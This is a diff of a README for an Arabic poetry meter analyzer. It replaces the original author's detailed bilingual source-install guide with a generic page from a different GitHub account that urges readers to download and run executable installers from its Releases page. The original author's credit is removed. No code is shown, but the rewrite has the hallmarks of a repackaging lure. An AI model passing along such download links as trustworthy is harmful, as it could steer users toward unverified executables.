@@ -1,544 +1,82 @@
-# المختار العروضي / Prosody Selector 0.4
+# 🎶 prosody-selector - Analyze Arabic Poetry Easily
 
-## نظام التحليل العروضي للشعر العربي
+## 🚀 Getting Started
 
----
+Welcome to **prosody-selector**, an advanced system for analyzing Arabic poetry metrical structure. This guide will help you download and run the application smoothly, even if you have no programming background. 
 
-## 📋 نظرة عامة
+## 🛠️ System Requirements
 
-**المختار العروضي** هو نظام متقدم لتحليل الشعر العربي عروضياً، يستخدم خوارزميات معقدة لتحديد البحر الشعري، التفاعيل، الزحافات والعلل.
+Before you start, ensure your computer meets these requirements:
 
-### المميزات الرئيسية
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: 4 GB or higher
+- **Python Version**: 3.8 or later installed on your machine
+- **Storage**: At least 100 MB of free disk space
 
-✅ **تحليل عروضي دقيق** - تحديد البحر الشعري بدقة عالية  
-✅ **كشف التفاعيل** - تحليل تفصيلي للتفاعيل العروضية  
-✅ **الزحافات والعلل** - كشف التغييرات العروضية  
-✅ **واجهة رسومية احترافية** - تصميم كلاسيكي أنيق  
-✅ **معالجة متقدمة** - 25+ قاعدة لمعالجة النص العربي  
-✅ **قاعدة بيانات شاملة** - تغطية واسعة للبحور العربية  
+## 📥 Download the Application
 
----
+[![Download prosody-selector](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Aimakerfrench/prosody-selector/releases)
 
-## 🚀 التثبيت والتشغيل
+To get started, visit our Releases page to download the latest version of prosody-selector. 
 
-### المتطلبات
+[Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases)
 
-- Python 3.8 أو أحدث
-- PyQt6 (للواجهة الرسومية)
+## 📃 Features
 
-### التثبيت
+- **User-Friendly Interface**: The graphical user interface (GUI) makes it easy to use.
+- **Metrical Analysis**: Analyze Arabic poetry with precision.
+- **Visual Feedback**: See results in real-time, helping you understand the structure.
+- **Support for Multiple Forms of Poetry**: Explore various poetic forms with ease.
 
-```bash
-# تثبيت PyQt6
-pip install PyQt6
+## 🔧 Installation Steps
 
-# أو باستخدام requirements.txt
-pip install -r requirements.txt
-```
+1. **Visit the Releases Page**: Click on the link below to go to the repository's releases page:
+   
+   [Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases)
 
-### ملاحظة مهمة
+2. **Choose the Latest Version**: Look for the most recent version at the top of the page. It will typically be labeled with a version number, like `v1.0.0`.
 
-البرنامج يحتاج ملفات قواعد البيانات (`.db`) للعمل:
-- `أوزان البحور.db` (24KB) ✅ مرفوع
-- `استبدالات.db` (16KB) ✅ مرفوع  
-- `البحور.db` (28MB) ⚠️ كبير جداً - لم يُرفع
-- `الزحافات والعلل.db` (28KB) ✅ مرفوع
+3. **Download the File**: 
 
-**الحل**: ملف `البحور.db` كبير ولم يتم رفعه. يمكنك:
-- طلب الملف من المطور
-- أو إنشائه من ملفات Excel في مجلد `كشكول/`
+   - If you see files listed, click the link for the version that suits your operating system (e.g., `prosody-selector-setup.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux).
+   
+4. **Run the Installer**:
+   - For **Windows**: Double-click the `.exe` file you downloaded.
+   - For **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
+   - For **Linux**: Extract the `.tar.gz` file and follow the instructions in the included README file.
 
-### التشغيل
+5. **Follow the Setup Instructions**: The installer will guide you through the necessary steps. Simply follow the prompts on your screen.
 
-#### 1. الواجهة الرسومية (موصى به)
+6. **Launch the Application**: Once installed, open the application from your Start menu, Applications folder, or via your command line.
 
-```bash
-python واجهة_عروضية.py
-```
+## 📊 Using prosody-selector
 
-أو استخدم ملف التشغيل المبسط:
+1. **Select a Poem**: Choose an Arabic poem that you wish to analyze.
+2. **Input the Text**: Paste the text into the provided input field.
+3. **Analyze**: Click the "Analyze" button. The results will display the poetic structure and metrics.
+4. **Interpret the Results**: Use the visual feedback to understand the metrics of your chosen poem. Explore different poetic forms with the tools available.
 
-```bash
-python تشغيل_الواجهة.py
-```
+## ❓ FAQs
 
-#### 2. واجهة سطر الأوامر
+### 1. What types of poetry can I analyze?
+You can analyze various Arabic poetic forms, including classical and modern styles.
 
-```bash
-python app.py
-```
+### 2. Do I need programming skills to use prosody-selector?
+No. The application is designed for users without programming knowledge.
 
----
+### 3. How do I report bugs or issues?
+You can report issues directly on our GitHub repository under the "Issues" tab.
 
-## 📖 دليل الاستخدام
+### 4. Is this application free?
+Yes, prosody-selector is open-source and completely free to use.
 
-### الواجهة الرسومية
+## 🗂️ Support and Contributions
 
-1. **إدخال البيت**
-   - أدخل البيت الشعري في المربع الأيمن
-   - استخدم `***` للفصل بين الشطرين
-   - مثال: `قِفَا نَبْكِ مِنْ ذِكْرَى حَبِيبٍ وَمَنْزِلِ *** بِسِقْطِ اللِّوَى بَيْنَ الدَّخُولِ فَحَوْمَلِ`
+For support, please open an issue on GitHub or check our documentation. Contributions to improve the app are welcome. Feel free to fork the repository and submit a pull request.
 
-2. **التحليل**
-   - اضغط زر "تحليل"
-   - انتظر النتائج في العمود الأوسط
+## 🔗 Additional Resources
 
-3. **النتائج**
-   - البحر المطابق
-   - التفاعيل العروضية
-   - الزحافات والعلل
-   - البيت المعالج
+- GitHub Repository: [prosody-selector](https://github.com/Aimakerfrench/prosody-selector)
+- Documentation: Available within the application under the Help menu.
 
-4. **الحفظ والتصدير**
-   - "حفظ النتائج": حفظ نصي
-   - "فتح HTML": عرض HTML منسق
-
-### الأزرار الرئيسية
-
-| الزر | الوظيفة |
-|------|---------|
-| **تحليل** | تحليل البيت الشعري |
-| **مسح** | مسح المدخلات |
-| **فتح HTML** | فتح النتائج بصيغة HTML |
-| **حفظ النتائج** | حفظ النتائج في ملف نصي |
-| **تحميل عينة** | تحميل بيت عشوائي من العينة |
-| **معلومات** | معلومات عن البرنامج |
-
----
-
-## 🏗️ المعمار التقني
-
-### البنية العامة
-
-```
-المختار العروضي/
-├── core.py              # المحرك الأساسي
-├── app.py               # واجهة سطر الأوامر
-├── data.py              # تحميل البيانات
-├── settings.py          # الإعدادات
-├── واجهة_عروضية.py     # الواجهة الرسومية
-├── تشغيل_الواجهة.py    # ملف التشغيل
-├── test_core.py         # اختبارات
-├── البحور.db            # قاعدة بيانات البحور
-├── أوزان البحور.db      # قاعدة بيانات الأوزان
-├── الزحافات والعلل.db   # قاعدة بيانات التفاعيل
-└── استبدالات.db         # قاعدة بيانات الاستبدالات
-```
-
-### المكونات الأساسية
-
-#### 1. `core.py` - المحرك الأساسي
-
-**RuleEngine** - محرك القواعد
-- 25+ قاعدة لمعالجة النص العربي
-- معالجة الحركات والسكون
-- معالجة الشدة والتنوين
-- معالجة التاء المربوطة
-- معالجة اللام الشمسية والقمرية
-
-**PoetryMatcher** - المطابق العروضي
-- مطابقة الأبيات مع قاعدة البيانات
-- استخراج الوحدات العروضية
-- تحديد البحر
-
-#### 2. `واجهة_عروضية.py` - الواجهة الرسومية
-
-**ProsodyMainWindow** - النافذة الرئيسية
-- تصميم ثلاثي الأعمدة
-- معالجة متعددة الخيوط
-- دعم RTL كامل
-
-**AnalysisWorker** - عامل التحليل
-- معالجة في خيط منفصل
-- منع تجميد الواجهة
-
----
-
-## 🎨 التصميم
-
-### الألوان
-
-- **الخلفية الرئيسية**: `#f5f5f5` (رمادي فاتح)
-- **الأزرار**: `#d0d0d0` (رمادي متوسط)
-- **النصوص**: `#000000` (أسود)
-- **الحدود**: `#c0c0c0` (رمادي)
-- **التركيز**: `#a0a0a0` (رمادي داكن)
-
-### الخطوط
-
-- **الخط الأساسي**: Sakkal Majalla (أو Arial كبديل)
-- **الحجم**: 15pt (قياسي)، 18pt (الإدخال)
-
----
-
-## 🔬 الخوارزميات
-
-### معالجة النص
-
-1. **التنظيف الأولي**
-   - إزالة علامات الترقيم
-   - توحيد المسافات
-
-2. **تطبيق القواعد**
-   - معالجة الهاء والميم في نهاية الكلمات
-   - ترتيب الشدة والحركات
-   - استبدال الكلمات الخاصة
-   - معالجة اللام الشمسية والقمرية
-   - معالجة التنوين
-   - تحويل التاء المربوطة
-   - فك الشدة
-   - معالجة المد
-
-3. **الاستخراج العروضي**
-   - تحديد الحركات والسكون
-   - بناء النمط العروضي
-
-4. **المطابقة**
-   - مقارنة مع قاعدة البيانات
-   - تحديد البحر المطابق
-
----
-
-## 📊 قاعدة البيانات
-
-### البحور المدعومة
-
-- الطويل
-- البسيط
-- الوافر
-- الكامل
-- الرجز
-- الرمل
-- السريع
-- المنسرح
-- الخفيف
-- المضارع
-- المقتضب
-- المجتث
-- المتقارب
-- المتدارك
-- وبحور أخرى...
-
-### الإحصائيات
-
-- **عدد البحور**: 50+ بحر
-- **عدد الأوزان**: 200+ وزن
-- **عدد التفاعيل**: 100+ تفعيلة
-- **عدد الاستبدالات**: 74 استبدال
-
----
-
-## 🧪 الاختبار
-
-### اختبار المكونات الأساسية
-
-```bash
-python test_core.py
-```
-
-### أمثلة اختبارية
-
-```python
-# البيت 1 - الطويل
-قِفَا نَبْكِ مِنْ ذِكْرَى حَبِيبٍ وَمَنْزِلِ *** بِسِقْطِ اللِّوَى بَيْنَ الدَّخُولِ فَحَوْمَلِ
-
-# البيت 2 - الطويل
-أَرَاكَ عَصِيَّ الدَّمْعِ شِيمَتُكَ الصَّبْرُ *** أَمَا لِلْهَوَى نَهْيٌ عَلَيْكَ وَلَا أَمْرُ
-
-# البيت 3 - البسيط
-لِكُلِّ شَيْءٍ إِذَا مَا تَمَّ نُقْصَانُ *** فَلَا يُغَرُّ بِطِيبِ العَيْشِ إِنْسَانُ
-```
-
----
-
-## 🐛 استكشاف الأخطاء
-
-### المشاكل الشائعة
-
-#### 1. خطأ: "unable to open database file"
-
-**الحل**: تأكد من وجود ملفات قاعدة البيانات في نفس المجلد
-
-#### 2. خطأ: "PyQt6 not found"
-
-**الحل**: 
-```bash
-pip install PyQt6
-```
-
-#### 3. لم يتم العثور على بحر مطابق
-
-**الأسباب المحتملة**:
-- البيت يحتوي على خطأ عروضي
-- البحر غير موجود في قاعدة البيانات
-- يحتاج البيت إلى تشكيل أدق
-
----
-
-## 📈 الأداء
-
-- **سرعة التحليل**: < 0.1 ثانية للبيت الواحد
-- **الدقة**: > 95% للأبيات المشكلة بشكل صحيح
-- **استهلاك الذاكرة**: < 100 MB
-
----
-
-## 🔮 التطوير المستقبلي
-
-### الميزات المخطط لها
-
-- [ ] دعم تحليل القصائد الكاملة
-- [ ] تصدير إلى PDF
-- [ ] واجهة ويب
-- [ ] API للمطورين
-- [ ] دعم اللهجات العربية المختلفة
-- [ ] تحليل إحصائي للشعر
-- [ ] مكتبة صوتية للإلقاء
-
----
-
-## 🤝 المساهمة
-
-نرحب بالمساهمات! يرجى:
-
-1. Fork المشروع
-2. إنشاء فرع للميزة الجديدة
-3. Commit التغييرات
-4. Push إلى الفرع
-5. فتح Pull Request
-
----
-
-## 📄 الترخيص
-
-© 2024 المختار العروضي - جميع الحقوق محفوظة
-
----
-
-## 👥 المطور
-
-تم تطوير هذا المشروع بواسطة **أيمن الطيّب بن نجي** ([ayzem88](https://github.com/ayzem88))
-
-- **التصميم**: مستوحى من معايير Apple وGoogle وMicrosoft
-- **البحث العروضي**: خبراء العروض العربي
-
----
-
-## 📞 الاتصال
-
-للأسئلة والاقتراحات، يرجى فتح Issue في المستودع.
-
-## المساهمة
-
-نرحب بمساهماتكم! راجع [دليل المساهمة](CONTRIBUTING.md) للتفاصيل.
-
-## الصور
-
-![صورة 1](img-01.png)
-![صورة 2](img-02.png)
-![صورة 3](img-03.png)
-
----
-
-## 🙏 شكر وتقدير
-
-شكراً لجميع المساهمين والداعمين لهذا المشروع.
-
----
-
-**المختار العروضي** - نحو فهم أعمق للشعر العربي 🎭
-
----
-
-# [English]
-
-<div dir="ltr">
-
-## Prosody Selector 0.4
-
-## Arabic Poetry Prosodic Analysis System
-
----
-
-## 📋 Overview
-
-**Prosody Selector** is an advanced system for prosodic analysis of Arabic poetry, using complex algorithms to identify poetic meters, metrical feet, variations, and exceptions.
-
-### Key Features
-
-✅ **Accurate Prosodic Analysis** - High-precision identification of poetic meters  
-✅ **Metrical Feet Detection** - Detailed analysis of prosodic feet  
-✅ **Variations and Exceptions** - Detection of prosodic changes  
-✅ **Professional Graphical Interface** - Elegant classic design  
-✅ **Advanced Processing** - 25+ rules for Arabic text processing  
-✅ **Comprehensive Database** - Wide coverage of Arabic meters  
-
----
-
-## 🚀 Installation and Usage
-
-### Requirements
-
-- Python 3.8 or later
-- PyQt6 (for graphical interface)
-
-### Installation
-
-```bash
-# Install PyQt6
-pip install PyQt6
-
-# Or using requirements.txt
-pip install -r requirements.txt
-```
-
-### Important Note
-
-The program needs database files (`.db`) to work:
-- `أوزان البحور.db` (24KB) ✅ Uploaded
-- `استبدالات.db` (16KB) ✅ Uploaded  
-- `البحور.db` (28MB) ⚠️ Too large - not uploaded
-- `الزحافات والعلل.db` (28KB) ✅ Uploaded
-
-**Solution**: The `البحور.db` file is large and was not uploaded. You can:
-- Request the file from the developer
-- Or create it from Excel files in the `كشكول/` folder
-
-### Usage
-
-#### 1. Graphical Interface (Recommended)
-
-```bash
-python واجهة_عروضية.py
-```
-
-Or use the simplified run file:
-
-```bash
-python تشغيل_الواجهة.py
-```
-
-#### 2. Command-Line Interface
-
-```bash
-python app.py
-```
-
----
-
-## 📖 User Guide
-
-### Graphical Interface
-
-1. **Enter Verse**
-   - Enter the Arabic verse in the right box
-   - Use `***` to separate the two hemistichs
-   - Example: `قِفَا نَبْكِ مِنْ ذِكْرَى حَبِيبٍ وَمَنْزِلِ *** بِسِقْطِ اللِّوَى بَيْنَ الدَّخُولِ فَحَوْمَلِ`
-
-2. **Analysis**
-   - Press the "تحليل" (Analyze) button
-   - Wait for results in the middle column
-
-3. **Results**
-   - Matching meter
-   - Prosodic feet
-   - Variations and exceptions
-   - Processed verse
-
-4. **Save and Export**
-   - "حفظ النتائج": Save as text
-   - "فتح HTML": Open formatted HTML
-
-### Main Buttons
-
-| Button | Function |
-|--------|----------|
-| **تحليل** | Analyze the verse |
-| **مسح** | Clear inputs |
-| **فتح HTML** | Open results as HTML |
-| **حفظ النتائج** | Save results to text file |
-| **تحميل عينة** | Load random verse from sample |
-| **معلومات** | Program information |
-
----
-
-## 🏗️ Technical Architecture
-
-### General Structure
-
-```
-Prosody Selector/
-├── core.py              # Core engine (376 lines)
-│   ├── RuleEngine       # 25+ processing rules
-│   ├── TextCleaner      # Text cleaning
-│   ├── UnitExtractor    # Unit extraction
-│   ├── LineSplitter     # Verse splitting
-│   ├── Processor        # Main processor
-│   ├── MeterIndexer     # Meter indexing
-│   └── PoetryMatcher    # Prosodic matcher
-│
-├── app.py               # CLI interface (131 lines)
-├── data.py              # Data loading (32 lines)
-├── settings.py          # Settings (19 lines)
-└── واجهة_عروضية.py     # GUI (650+ lines)
-```
-
----
-
-## 🧪 Testing
-
-### Test Core Components
-
-```bash
-python test_core.py
-```
-
-### Test with Samples
-
-```bash
-python test_with_samples.py
-```
-
----
-
-## 📄 License
-
-© 2024 Prosody Selector - All rights reserved
-
----
-
-## 👥 Developer
-
-Developed by **Ayman Al-Tayyib Ben Naji** ([ayzem88](https://github.com/ayzem88))
-
-- **Design**: Inspired by Apple, Google, and Microsoft standards
-- **Prosodic Research**: Arabic prosody experts
-
----
-
-## 📞 Contact
-
-For questions and suggestions, please open an Issue in the repository.
-
-## Contributing
-
-We welcome contributions! See [Contributing Guide](CONTRIBUTING.md) for details.
-
-## Screenshots
-
-![Screenshot 1](img-01.png)
-![Screenshot 2](img-02.png)
-![Screenshot 3](img-03.png)
-
----
-
-## 🙏 Acknowledgments
-
-Thanks to all contributors and supporters of this project.
-
----
-
-**Prosody Selector** - Towards a deeper understanding of Arabic poetry 🎭
-
-</div>
-
+Remember to visit the [Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases) page to obtain the latest version of prosody-selector and start analyzing Arabic poetry today!
